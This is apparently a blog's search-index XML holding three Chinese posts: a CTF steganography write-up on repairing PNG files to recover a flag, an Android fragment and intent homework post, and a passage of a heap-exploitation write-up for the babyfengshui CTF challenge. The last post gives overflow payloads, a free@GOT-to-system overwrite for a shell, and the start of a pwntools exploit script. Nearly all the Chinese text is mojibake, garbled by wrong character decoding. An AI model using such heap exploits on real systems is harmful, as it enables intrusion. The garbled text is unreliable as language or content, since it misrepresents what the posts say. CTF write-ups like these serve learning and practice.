<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>æ¹–å—çœèµ›2019-FindMe</title>
      <link href="/posts/53535fb6/"/>
      <url>/posts/53535fb6/</url>
      
        <content type="html"><![CDATA[<h2 id="æ¹–å—çœèµ›2019-Findme"><a href="#æ¹–å—çœèµ›2019-Findme" class="headerlink" title="[æ¹–å—çœèµ›2019]Findme"></a>[æ¹–å—çœèµ›2019]Findme</h2><p>è¿™é“é¢˜çœŸçš„â€¦â€¦â€¦..ç¦»è°±æŠ½è±¡</p><p>æ‹¿åˆ°æ‰‹åæ˜¯5å¼ å›¾ç‰‡</p><h2 id="1-png"><a href="#1-png" class="headerlink" title="1.png"></a>1.png</h2><p>å°†ç¬¬ä¸€å¼ å›¾ç‰‡æ”¾å…¥åˆ°010ä¸­ crcæŠ¥é”™ </p><p><img src="https://pic.imgdb.cn/item/6714fb59d29ded1a8cf63a9f.png"></p><p>githubä¸Šæœ‰ä¸ªé¡¹ç›®å«åšDeformed-Image-Restorer</p><p>å¯ä»¥å¿«é€Ÿä¿®å¤crcæŠ¥é”™</p><p><img src="https://pic.imgdb.cn/item/6714fbfad29ded1a8cf7dbbf.png"></p><p>å¾—åˆ°è¿™æ ·ä¸€å¼ å›¾ç‰‡</p><p><img src="https://pic.imgdb.cn/item/6714fc2cd29ded1a8cf85936.png"></p><p>æ‹–å…¥010ä¸­åˆ†æ åˆ‡æ¢è§†å›¾ä¸ºæ¨¡æ¿åå‘ç°æœ‰ä¸¤ä¸ªç»“æ„å—ç¼ºå°‘IDAT</p><p><img src="https://pic.imgdb.cn/item/6714fcdfd29ded1a8cfa259a.png"></p><p>IDATä¸º<code>49 44 41 54</code></p><p>è¡¥å…¨ç¼ºå¤±çš„IDATåå³å¯çœ‹åˆ°åŸå›¾ç‰‡</p><p><img src="https://pic.imgdb.cn/item/6714fd5dd29ded1a8cfb17a6.png"></p><p>æ”¾å…¥Stegsolveä¸­åˆ†æ</p><p>åœ¨Blue Plane2ä¸­å‘ç°äºŒç»´ç  æ‰«æå¾—åˆ°ä¸€æ®µæ–‡æœ¬</p><p><img src="https://pic.imgdb.cn/item/6714fde8d29ded1a8cfc49e4.png"></p><p><strong>ZmxhZ3s0X3</strong></p><h2 id="2-png"><a href="#2-png" class="headerlink" title="2.png"></a>2.png</h2><p>æ”¾å…¥010åˆ†æååœ¨ä¸‹æ–¹ä¼šå‘ç°7zå­—æ · å°†ä¹‹åçš„ä¿¡æ¯å…¨éƒ¨ä¿å­˜åˆ°æ–°çš„æ–‡ä»¶ä¸­</p><p><img src="https://pic.imgdb.cn/item/6714fe93d29ded1a8cfdd378.png"></p><p>å‘ç°åº”è¯¥æ˜¯.zipçš„å¼€å¤´ï¼ŒæŠŠ37 7Aå…¨éƒ¨æ›¿æ¢ä¸º50 4Båå¦å­˜ä¸º.zipæ–‡ä»¶</p><p><img src="https://pic.imgdb.cn/item/6714fef8d29ded1a8cfea62f.png"></p><p>å°†å‹ç¼©åŒ…ä¸­çš„æ–‡ä»¶ä»¥å¤§å°æ’åºåæŸ¥çœ‹ç¬¬ä¸€ä¸ªå‘ç°ä¿¡æ¯</p><p><img src="https://pic.imgdb.cn/item/6714ff2ed29ded1a8cff445d.png"></p><p><strong>1RVcmVfc</strong></p><h2 id="3-png"><a href="#3-png" class="headerlink" title="3.png"></a>3.png</h2><p>å°†3.pngæ”¾å…¥010ä¸­</p><p>ä»¥æ¨¡æ¿è§†å›¾çš„æ–¹å¼æ‰“å¼€æ–‡ä»¶</p><p><img src="https://pic.imgdb.cn/item/67159e96d29ded1a8c132190.png"></p><p>è®°å½•é™¤äº†æœ€åä¸€ä¸ªstructçš„æ‰€æœ‰crcå€¼ è¿™äº›crcå€¼å¯¹åº”çš„asciiç å‡ä¸ºå¯è§å­—ç¬¦</p><p><strong><code>33 52 6C 5A 33 30 3D</code></strong></p><p>å°†å¾—åˆ°çš„åå…­è¿›åˆ¶è½¬æ¢ä¸ºasciiç </p><p>è½¬æ¢å¾—åˆ°</p><p><strong>3RlZ30&#x3D;</strong></p><h2 id="4-5-png"><a href="#4-5-png" class="headerlink" title="4&#x2F;5.png"></a>4&#x2F;5.png</h2><p>4å’Œ5éå¸¸ç®€å• æ‹–è¿›010åç›´æ¥æ‹‰åˆ°æœ«å°¾æœ‰æç¤º</p><p><img src="https://pic.imgdb.cn/item/6715bd54d29ded1a8c53e441.png"></p><p><strong>cExlX1BsY</strong></p><p><img src="https://pic.imgdb.cn/item/6715bdeed29ded1a8c555f43.png"></p><p><strong>Yzcllfc0lN</strong></p><h2 id="æ€»å’Œ"><a href="#æ€»å’Œ" class="headerlink" title="æ€»å’Œ"></a>æ€»å’Œ</h2><p>1.<strong>ZmxhZ3s0X3</strong></p><p>2.<strong>1RVcmVfc</strong></p><p>3.<strong>3RlZ30&#x3D;</strong></p><p>4.<strong>cExlX1BsY</strong></p><p>5.<strong>Yzcllfc0lN</strong></p><p>é¡ºåºè¢«æ‰“ä¹±äº†è¿˜éœ€è¦å¯¹å…¶è¿›è¡Œæ‹¼æ¥ğŸ’”ğŸ’”ğŸ’”</p><p>æœ€ç»ˆçš„é¡ºåºæ˜¯  1 -&gt; 5 -&gt;4 -&gt; 2 -&gt; 3</p><p><strong>ZmxhZ3s0X3Yzcllfc0lNcExlX1BsY1RVcmVfc3RlZ30&#x3D;</strong></p><p>base64è§£ç </p><p><img src="https://pic.imgdb.cn/item/6715bf7ed29ded1a8c5915fc.png"></p><p><strong>flag{4_v3rY_sIMpLe_PlcTUre_steg}</strong></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> MISC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> MISC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ASå®ç°å¾®ä¿¡åŸºç¡€æ¡†æ¶</title>
      <link href="/posts/af3f14ca/"/>
      <url>/posts/af3f14ca/</url>
      
        <content type="html"><![CDATA[<h1 id="ASå®ç°åŸºç¡€å¾®ä¿¡æ¡†æ¶"><a href="#ASå®ç°åŸºç¡€å¾®ä¿¡æ¡†æ¶" class="headerlink" title="ASå®ç°åŸºç¡€å¾®ä¿¡æ¡†æ¶"></a>ASå®ç°åŸºç¡€å¾®ä¿¡æ¡†æ¶</h1><h2 id="æˆæœå±•ç¤º"><a href="#æˆæœå±•ç¤º" class="headerlink" title="æˆæœå±•ç¤º"></a>æˆæœå±•ç¤º</h2><p>åˆ†åˆ«ç‚¹å‡»å››ä¸ªå¯¹åº”çš„æŒ‰é’®åˆ™ä¼šå‡ºç°åˆ†åˆ«å¯¹åº”çš„é¡µé¢</p><p><img src="https://pic.imgdb.cn/item/673725ced29ded1a8c970e38.png"></p><p>åœ¨è”ç³»äººçš„é¡µé¢ä¸­</p><p>ç‚¹å‡»<code>çˆ¸çˆ¸</code> åˆ™ä¼šå‡ºç°è¯¦ç»†çš„é¡µé¢ ç‚¹å‡»è¿”å›æŒ‰é’®è¿”å›åˆ°ä¸Šä¸€ä¸ªé¡µé¢</p><p><img src="https://pic.imgdb.cn/item/67372744d29ded1a8c98d018.png"></p><h2 id="ä»£ç è§£é‡Š"><a href="#ä»£ç è§£é‡Š" class="headerlink" title="ä»£ç è§£é‡Š"></a>ä»£ç è§£é‡Š</h2><h3 id="javaæ–‡ä»¶"><a href="#javaæ–‡ä»¶" class="headerlink" title="javaæ–‡ä»¶"></a>javaæ–‡ä»¶</h3><p><img src="https://pic.imgdb.cn/item/673727d5d29ded1a8c998725.png"></p><p>ä¸»æ–‡ä»¶mainactivity2 å¼•ç”¨å››ä¸ªfragmentæ–‡ä»¶ï¼ˆchat,my,concat,discoveryï¼‰å¯¹åº”å››ä¸ªtagé¡µé¢</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åŠ è½½é»˜è®¤çš„èŠå¤©Fragment</span></span><br><span class="line">       loadFragment(<span class="keyword">new</span> <span class="title class_">ChatFragment</span>());</span><br><span class="line"></span><br><span class="line">       <span class="comment">// è®¾ç½®æŒ‰é’®ç‚¹å‡»äº‹ä»¶</span></span><br><span class="line">       findViewById(R.id.button_chat).setOnClickListener(v -&gt; loadFragment(<span class="keyword">new</span> <span class="title class_">ChatFragment</span>()));</span><br><span class="line">       findViewById(R.id.button_contacts).setOnClickListener(v -&gt; loadFragment(<span class="keyword">new</span> <span class="title class_">ContactsFragment</span>()));</span><br><span class="line">       findViewById(R.id.button_discovery).setOnClickListener(v -&gt; loadFragment(<span class="keyword">new</span> <span class="title class_">DiscoveryFragment</span>()));</span><br><span class="line">       findViewById(R.id.button_my).setOnClickListener(v -&gt; loadFragment(<span class="keyword">new</span> <span class="title class_">MyFragment</span>()));</span><br></pre></td></tr></table></figure><p>å››ä¸ªfragmentæ–‡ä»¶ ä»¥chatfragmentä¸ºä¾‹</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.helloworld;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> androidx.fragment.app.Fragment;</span><br><span class="line"><span class="keyword">import</span> android.view.LayoutInflater;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.view.ViewGroup;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChatFragment</span> <span class="keyword">extends</span> <span class="title class_">Fragment</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> View <span class="title function_">onCreateView</span><span class="params">(LayoutInflater inflater, ViewGroup container,</span></span><br><span class="line"><span class="params">                             Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="comment">// Inflate the layout for this fragment</span></span><br><span class="line">        <span class="keyword">return</span> inflater.inflate(R.layout.fragment_chat, container, <span class="literal">false</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è”ç³»äººé¡µé¢ä½¿ç”¨intentæ–¹æ³•ä¼ é€’å¯¹åº”çš„æ‰€é€‰è”ç³»äººçš„å§“å</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">openContactDetail</span><span class="params">(String contactName)</span> &#123;</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(getActivity(), ContactDetailActivity.class);</span><br><span class="line">        intent.putExtra(<span class="string">&quot;contact_name&quot;</span>, contactName); <span class="comment">// ä¼ é€’è”ç³»äººå§“å</span></span><br><span class="line">        startActivity(intent);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å¸ƒå±€æ–‡ä»¶"><a href="#å¸ƒå±€æ–‡ä»¶" class="headerlink" title="å¸ƒå±€æ–‡ä»¶"></a>å¸ƒå±€æ–‡ä»¶</h3><p><img src="https://pic.imgdb.cn/item/67372956d29ded1a8c9b63bc.png"></p><p>çº¢æ¡†æ¡†ä½çš„ä¸ºå››ä¸ªtagé¡µé¢çš„åŸºç¡€å¸ƒå±€</p><p>è”ç³»äººé¡µé¢ä½¿ç”¨ScrollViewæ¥å®ç°å‚ç›´æ»šåŠ¨å¸ƒå±€å’Œå‚ç›´çº¿æ€§å¸ƒå±€å®¹çº³è”ç³»äºº</p><p><code>ScrollView</code> æ˜¯ä¸€ç§å¸ƒå±€å®¹å™¨ï¼Œå®ƒå…è®¸å­è§†å›¾è¶…å‡ºå±å¹•æ—¶å¯ä»¥æ»šåŠ¨æ˜¾ç¤ºã€‚<code>ScrollView</code> æ˜¯ä¸€ä¸ªå‚ç›´æ»šåŠ¨å®¹å™¨ï¼Œæ„å‘³ç€å®ƒé»˜è®¤æ”¯æŒå‚ç›´æ–¹å‘çš„æ»šåŠ¨ã€‚</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FrameLayout</span> <span class="attr">xmlns:android</span>=<span class="string">&quot;http://schemas.android.com/apk/res/android&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">&quot;http://schemas.android.com/tools&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">&quot;.ContactsFragment&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- å‚ç›´æ»šåŠ¨å¸ƒå±€ --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ScrollView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">&quot;match_parent&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- å‚ç›´çº¿æ€§å¸ƒå±€ï¼Œç”¨äºå®¹çº³è”ç³»äºº --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:orientation</span>=<span class="string">&quot;vertical&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:gravity</span>=<span class="string">&quot;center_horizontal&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="comment">&lt;!-- æ¯ä¸ªè”ç³»äººï¼ŒåŒ…æ‹¬å›¾ç‰‡å’Œå§“å --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">LinearLayout</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:layout_width</span>=<span class="string">&quot;match_parent&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:orientation</span>=<span class="string">&quot;horizontal&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:gravity</span>=<span class="string">&quot;center_vertical&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">android:padding</span>=<span class="string">&quot;8dp&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">ImageView</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">android:id</span>=<span class="string">&quot;@+id/contact_image1&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">android:layout_width</span>=<span class="string">&quot;50dp&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">android:layout_height</span>=<span class="string">&quot;50dp&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">android:src</span>=<span class="string">&quot;@drawable/sample_image_1&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">android:contentDescription</span>=<span class="string">&quot;Contact 1&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">android:layout_marginEnd</span>=<span class="string">&quot;16dp&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">android:onClick</span>=<span class="string">&quot;openContact1&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">                <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">android:layout_width</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">android:layout_height</span>=<span class="string">&quot;wrap_content&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">android:text</span>=<span class="string">&quot;çˆ¸çˆ¸&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">android:textSize</span>=<span class="string">&quot;18sp&quot;</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ScrollView</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">FrameLayout</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/67372e5fd29ded1a8ca18074.gif"></p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><h3 id="fragmentæ–¹æ³•çš„ä½¿ç”¨"><a href="#fragmentæ–¹æ³•çš„ä½¿ç”¨" class="headerlink" title="fragmentæ–¹æ³•çš„ä½¿ç”¨"></a>fragmentæ–¹æ³•çš„ä½¿ç”¨</h3><p><code>Fragment</code> æ˜¯ä¸€ç§å¯é‡ç”¨çš„ç”¨æˆ·ç•Œé¢ç»„ä»¶ï¼Œå¯ä»¥åµŒå…¥åˆ° <code>Activity</code> ä¸­</p><p><strong>1. åˆ›å»º Fragment</strong></p><p>è¦ä½¿ç”¨ <code>Fragment</code>ï¼Œé¦–å…ˆéœ€è¦åˆ›å»ºä¸€ä¸ªç»§æ‰¿è‡ª <code>Fragment</code> ç±»çš„å­ç±»ï¼Œå¹¶å®ç°å…¶ <code>onCreateView</code> æ–¹æ³•ï¼Œè¯¥æ–¹æ³•è´Ÿè´£åˆ›å»ºå’Œè¿”å› <code>Fragment</code> çš„è§†å›¾ã€‚</p><p><strong>2. æ·»åŠ  Fragment åˆ° Activity ä¸­</strong></p><p>åœ¨ <code>Activity</code> ä¸­ä½¿ç”¨ <code>Fragment</code> é€šå¸¸é€šè¿‡ <code>FragmentTransaction</code> è¿›è¡Œï¼Œä½¿ç”¨ <code>add()</code>, <code>replace()</code>, <code>remove()</code> ç­‰æ–¹æ³•åŠ¨æ€æ·»åŠ ã€æ›¿æ¢æˆ–ç§»é™¤ <code>Fragment</code>ã€‚</p><p><strong>3.ä½¿ç”¨ <code>Fragment</code> ä¼ é€’æ•°æ®</strong></p><p>æœ‰æ—¶ï¼Œä½ å¯èƒ½éœ€è¦ä» <code>Activity</code> å‘ <code>Fragment</code> ä¼ é€’æ•°æ®ã€‚å¯ä»¥é€šè¿‡ <code>Fragment</code> çš„ <code>setArguments()</code> æ–¹æ³•ä¼ é€’æ•°æ®ï¼Œè¿™æ ·æ•°æ®åœ¨ <code>Fragment</code> ç”Ÿå‘½å‘¨æœŸå†…æ˜¯æŒä¹…çš„ã€‚</p><h3 id="intentä½¿ç”¨"><a href="#intentä½¿ç”¨" class="headerlink" title="intentä½¿ç”¨"></a>intentä½¿ç”¨</h3><p><code>Intent</code> æ˜¯ç”¨äºåœ¨ä¸åŒç»„ä»¶ä¹‹é—´è¿›è¡Œäº¤äº’çš„åŸºç¡€æœºåˆ¶ã€‚å®ƒå¯ä»¥ç”¨æ¥å¯åŠ¨æ´»åŠ¨ï¼ˆActivityï¼‰ã€æœåŠ¡ï¼ˆServiceï¼‰æˆ–è€…å‘é€å¹¿æ’­ï¼ˆBroadcastï¼‰</p><p>å¯åŠ¨æ–°çš„æ´»åŠ¨æ˜¯ <code>Intent</code> æœ€å¸¸è§çš„ç”¨é€”ä¹‹ä¸€ã€‚æœ‰æ˜¾å¼å’Œéšå¼ä¸¤ç§æ–¹æ³•ã€‚</p><p><strong>æ˜¾å¼ Intentï¼šæŒ‡å®šæ˜ç¡®çš„ç›®æ ‡ <code>Activity</code></strong></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// æ˜¾å¼ Intent å¯åŠ¨ç›®æ ‡æ´»åŠ¨</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(<span class="built_in">this</span>, TargetActivity.class);</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure><p><strong>éšå¼ Intentï¼šç³»ç»Ÿæ ¹æ® <code>Intent</code> çš„å†…å®¹æŸ¥æ‰¾åˆé€‚çš„ç›®æ ‡ <code>Activity</code></strong></p><p>éšå¼ <code>Intent</code> ä¸æŒ‡å®šç›®æ ‡ <code>Activity</code>ï¼Œè€Œæ˜¯é€šè¿‡ <code>Intent</code> ä¸­çš„åŠ¨ä½œï¼ˆactionï¼‰æˆ–æ•°æ®ï¼ˆdataï¼‰æ¥æŸ¥æ‰¾åŒ¹é…çš„æ´»åŠ¨ã€‚ä¾‹å¦‚ï¼Œæ‰“å¼€ç½‘é¡µæˆ–è€…æ‹¨æ‰“ç”µè¯ã€‚</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// éšå¼ Intent å¯åŠ¨æµè§ˆå™¨æ‰“å¼€ URL</span></span><br><span class="line"><span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>(Intent.ACTION_VIEW, Uri.parse(<span class="string">&quot;http://www.example.com&quot;</span>));</span><br><span class="line">startActivity(intent);</span><br></pre></td></tr></table></figure><p>è¿˜å¯ä»¥ä½¿ç”¨intentä¼ é€’ä¸åŒç§ç±»çš„æ•°æ®ï¼Œæœ¬é¡¹ç›®ä¸­ä½¿ç”¨åˆ°è¯¥åŠŸèƒ½</p><p>intentå¯ä»¥å®ç°æ›´åŠ çµæ´»çš„å’ŒåŠ¨æ€ç»„ä»¶äº¤äº’</p><p>å…·ä½“æºç è§ </p><p><a href="https://github.com/Moodhappiness/AndroidStudy.git">æºç </a></p>]]></content>
      
      
      <categories>
          
          <category> å®‰å“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AndroidStudio </tag>
            
            <tag> ä½œä¸š </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>babyfengshui_33c3_2016</title>
      <link href="/posts/212eee63/"/>
      <url>/posts/212eee63/</url>
      
        <content type="html"><![CDATA[<h1 id="babyfengshui-33c3-2016"><a href="#babyfengshui-33c3-2016" class="headerlink" title="babyfengshui_33c3_2016"></a>babyfengshui_33c3_2016</h1><p>é¦–å…ˆchecksecæŸ¥çœ‹ä¿æŠ¤æœºåˆ¶</p><p><img src="https://pic.imgdb.cn/item/6718d698d29ded1a8cd28ae6.png"></p><p>32ä½ åªå¼€äº†NXä¿æŠ¤å’ŒCanary</p><p>è¿è¡Œæ˜¯å¸¸è§çš„å †èœå•ç±»é¢˜ç›®ã€‚å¢åŠ ï¼Œåˆ é™¤ï¼Œä¿®æ”¹ï¼Œå±•ç¤º</p><h3 id="idaåç¼–è¯‘åˆ†æ"><a href="#idaåç¼–è¯‘åˆ†æ" class="headerlink" title="idaåç¼–è¯‘åˆ†æ"></a>idaåç¼–è¯‘åˆ†æ</h3><h4 id="addå‡½æ•°"><a href="#addå‡½æ•°" class="headerlink" title="addå‡½æ•°"></a>addå‡½æ•°</h4><p><img src="https://pic.imgdb.cn/item/6718d764d29ded1a8cd37488.png"></p><p>é¦–å…ˆåˆ›å»ºè¾“å…¥çš„descriptionçš„chunkå—ï¼Œæ¥ç€ç”³è¯·0x80å¤§å°çš„chunk</p><p>å¹¶ä¸”å°†description_chunkä¸­çš„æŒ‡é’ˆå­˜æ”¾åˆ°äº†ç¬¬äºŒä¸ªchunkä¸­  å¹¶å­˜æ”¾ç¬¬äºŒä¸ªchunkçš„æŒ‡é’ˆ</p><p>æ¥ç€è°ƒç”¨get_nameå‡½æ•°åœ¨ç¬¬äºŒä¸ªchunkæŒ‡é’ˆ+4å¤„è¯»å…¥å­—èŠ‚</p><p><img src="https://pic.imgdb.cn/item/6718e2d4d29ded1a8ce0ef01.png"></p><p>get_nameå‡½æ•°è®¾ç½®äº†ä¸€ä¸ªæ£€æŸ¥</p><p>ä¹‹åä¾¿ä¼šè°ƒç”¨updateå‡½æ•°</p><h4 id="updateå‡½æ•°"><a href="#updateå‡½æ•°" class="headerlink" title="updateå‡½æ•°"></a>updateå‡½æ•°</h4><p><img src="https://pic.imgdb.cn/item/6718e317d29ded1a8ce13e39.png"></p><p>updateå‡½æ•°ä¸­å­˜åœ¨ä¸€ä¸ªæ£€æŸ¥æœºåˆ¶ï¼Œé˜²æ­¢å †æº¢å‡º</p><p>é™åˆ¶äº†è¾“å…¥çš„é•¿åº¦+descriptionæŒ‡é’ˆå¦‚æœ&gt;&#x3D;æŒ‡å‘ç›¸é‚»çš„name_chunkçš„æŒ‡é’ˆçš„è¯ä¾¿ä¼šé€€å‡º</p><p>ä½†è¿™é‡ŒåŒæ ·ä¹Ÿå­˜åœ¨ä¸€ä¸ªé—®é¢˜ï¼Œå› ä¸ºè¿™ä¸ªä¿æŠ¤æœºåˆ¶åªé’ˆå¯¹ç›¸é‚»çš„ä¸€ç»„description_chunkä¸name_chunk</p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡å…ˆfreeæ‰ä¸€ä¸ªchunkåå†æ¬¡ç”³è¯·å°±æœ‰å¯èƒ½é€ æˆdescription_chunkä¸name_chunkä¸ç›¸é‚»</p><h4 id="deleteå‡½æ•°"><a href="#deleteå‡½æ•°" class="headerlink" title="deleteå‡½æ•°"></a>deleteå‡½æ•°</h4><p><img src="https://pic.imgdb.cn/item/6718e56dd29ded1a8ce3f871.png"></p><p>deleteå‡½æ•°è§å›¾ç‰‡æ³¨é‡Šï¼Œname_chunkè¢«freeåæŒ‡é’ˆç½®0ä½†description_chunkæ²¡æœ‰ç½®0</p><p>description_chunkä¸­å­˜åœ¨UAF</p><h4 id="displayå‡½æ•°"><a href="#displayå‡½æ•°" class="headerlink" title="displayå‡½æ•°"></a>displayå‡½æ•°</h4><p><img src="https://pic.imgdb.cn/item/6718e5dcd29ded1a8ce4bbdc.png"></p><p>è§å›¾ç‰‡æ³¨é‡Š</p><h3 id="æ„é€ exp"><a href="#æ„é€ exp" class="headerlink" title="æ„é€ exp"></a>æ„é€ exp</h3><p>å¤§è‡´æ€è·¯å°±æ˜¯é¦–å…ˆæ„é€ ä¸ç›¸é‚»çš„description_chunkå’Œname_chunkï¼Œæ¥ç€åˆ©ç”¨å †æº¢å‡ºæ³„éœ²å‡ºfreeå‡½æ•°çš„çœŸå®åœ°å€åå°†free_gotåœ°å€æ›¿æ¢ä¸ºsystemå‡½æ•°çš„åœ°å€ï¼Œæ‰§è¡Œshell</p><p>é¦–å…ˆç”³è¯·ä¸‰ä¸ªå †å—</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;nam1&#x27;</span>, <span class="number">0x80</span>, <span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;nam2&#x27;</span>, <span class="number">0x80</span>, <span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>, <span class="string">b&#x27;nam3&#x27;</span>, <span class="number">0x80</span>, <span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨gdb.attach()è°ƒè¯•</p><p><img src="https://pic.imgdb.cn/item/6718f1cdd29ded1a8cef70ec.png"></p><p>å¯ä»¥çœ‹åˆ°addä¸‰</p><p>æ¬¡åå‡ºç°äº†6ä¸ªchunkä¹‹ådelete(0)åç¬¬ä¸€ç»„çš„descriptioh_chunkä¸ç¬¬ä¸€ç»„çš„name_chunkåˆå¹¶åˆ°unsorted_binä¸­</p><p>å†æ¬¡ç”³è¯·0x100å¤§å°çš„chunk è¿™ä¸ª0x100å¤§å°çš„chunkå¤§äºåŸæ¥é‡Šæ”¾çš„description_chunkçš„å¤§å°ï¼Œé‚£ä¹ˆä¹‹åè·Ÿéšç”³è¯·çš„0x80å¤§å°çš„chunkå°†è¢«æ”¾åˆ°å †å°¾</p><p><img src="https://pic.imgdb.cn/item/67199a56d29ded1a8c63ca49.png"></p><p><img src="https://pic.imgdb.cn/item/67199a9bd29ded1a8c63ee7f.png"></p><p>è¿™æ—¶æˆ‘ä»¬åœ¨freeæ‰ä¹‹åå†æ¬¡ç”³è¯·çš„chunkçš„description_chunkä¸name_chunkä¸ç›¸é‚»ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥ä½¿ç”¨è¿™æ—¶çš„description_chunkæ¥è¿›è¡Œæº¢å‡º</p><p>æ„é€ **<code>payload = payload = b&#39;a&#39; * 0x108 + b&#39;a&#39; * 0x08 + b&#39;a&#39; * 0x80 + b&#39;a&#39; * 0x08 + p32(free_got)</code>**</p><p>è¦†ç›–nam2å †å—çš„fdæŒ‡é’ˆä¸ºfre_gotçš„åœ°å€ï¼Œshow(1)åä¾¿å¯å¾—åˆ°freeå‡½æ•°çš„çœŸå®åœ°å€ï¼Œè¿›è€Œæ³„éœ²libcåŸºå€ï¼Œæ›¿æ¢free_gotä¸ºsystemå‡½æ•°çœŸå®åœ°å€åfree nam3_chunk ä¾¿å¯è¾¾åˆ°system(â€˜&#x2F;bin&#x2F;shâ€™)çš„æ•ˆæœ</p><h4 id="EXPï¼š"><a href="#EXPï¼š" class="headerlink" title="EXPï¼š"></a>EXPï¼š</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span 